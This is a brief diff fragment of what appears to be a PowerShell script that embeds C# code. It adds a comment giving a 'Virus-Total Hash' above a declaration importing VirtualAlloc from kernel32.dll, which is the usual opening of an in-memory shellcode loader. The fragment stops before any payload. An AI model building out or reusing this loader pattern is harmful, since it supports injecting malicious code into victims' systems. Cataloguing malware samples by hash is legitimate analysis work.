@@ -1,3 +1,4 @@
+#f13f62255fc2cd63375f9f4ba3af00c24f60a3e87e4b78279c7c8a576bcecf13 Virus-Total Hash
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
